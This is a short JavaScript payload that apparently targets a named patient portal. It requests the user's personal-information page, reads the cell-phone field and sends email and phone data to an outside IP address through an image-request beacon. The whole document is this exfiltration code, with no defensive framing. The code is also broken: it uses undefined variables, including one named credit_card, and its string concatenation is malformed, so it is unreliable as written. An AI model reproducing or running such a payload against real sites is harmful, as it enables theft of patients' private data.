var req = new XMLHttpRequest();

req.onreadystatechange = function () {
if (req.readyState == 4 && req.status == 200 )
 {
 var htmlPage = req.responseXML;
 
 var phoneno = htmlPage.getElementById("per_CellPhone").innerHTML;
 
 document.getElementById("per_email").innerHTML = email;
 
 new Image().src = "https://172.105.54.23:443/?email="+email"&phoneno"+credit_card";

 }
};

req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/personalInfo_New.jsp?mainNav=Account&pgId=personalInfo_New&act=0", true);
req.responseType = "document";
req.send();
